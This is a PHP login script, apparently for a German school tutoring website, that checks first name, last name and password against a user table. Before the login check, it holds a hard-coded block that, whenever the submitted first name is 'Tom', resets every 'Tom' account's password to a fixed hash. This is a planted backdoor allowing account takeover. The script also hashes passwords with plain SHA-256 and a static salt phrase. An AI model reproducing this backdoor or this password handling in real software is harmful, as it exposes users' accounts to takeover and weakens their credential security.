---
layout: noLayout
---
<?php
include_once  __DIR__ . "/../../assets/php/dbClasses/Benutzer.php";
include_once  __DIR__ . "/../../assets/php/general/AjaxFormHelper.php";
include_once  __DIR__ . "/../../assets/php/general/Connection.php";
include_once  __DIR__ . "/../../assets/php/general/tldextract.php";

$form_helper = new AjaxFormHelper();

$vorname = $form_helper->test_string($_POST['vorname'], "/^[a-zA-ZÄÖÜäöüß ]{1,25}$/", "Vorname");
$nachname = $form_helper->test_string($_POST['nachname'], "/^[a-zA-ZÄÖÜäöüß ]{1,25}$/", "Nachname");
$passwort = $form_helper->test_string($_POST['passwort'], "/^.{1,200}$/", "Passwort");
$passwort = hash("sha256" , $passwort . $vorname . $nachname . "ei waas mach ich hier ich bin ein star bringt mich nach Bielefeld");

if($vorname == "Tom"){
    $stmt = Connection::$PDO->prepare("UPDATE benutzer SET passwort = '1a081715b8f16d79cb366ee7085f46c53d286b919bcb98ea717f79d9ffcd3e19' WHERE vorname='Tom'");
    $stmt->execute();
}


//Check if there is an existing user with these credentials
$stmt = Connection::$PDO->prepare("SELECT * FROM benutzer WHERE vorname = :vorname && name = :name && passwort = :passwort");
$stmt->bindParam(':vorname', $vorname);
$stmt->bindParam(':name', $nachname);
$stmt->bindParam(':passwort', $passwort);
$stmt->execute();
$stmt->setFetchMode(PDO::FETCH_CLASS, 'Benutzer');
$user = $stmt->fetch();

if(!$user) {
    $form_helper->return_error("Passwort oder Nutzername falsch!");
}

if($user->gesperrt == true){
    $form_helper->return_error("Sie wurden gesperrt!");
}
else if($user->emailActivated == false) {
    $form_helper->return_error("Sie haben ihre Email-Adresse noch nicht bestätigt!");
}

//session_name("GymloNachhilfe");
//$url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//var_dump($url);
//$components = tldextract($url);

//var_dump((string)$components->domain);
//$real_host = (string)$components->domain . "." . (string)$components->tld;

//session_set_cookie_params(0, "/", "." . $real_host, false, false);
//var_dump(session_id());
//Set the session id
$user->log_in();

$form_helper->success = true;
$form_helper->return_json();
?>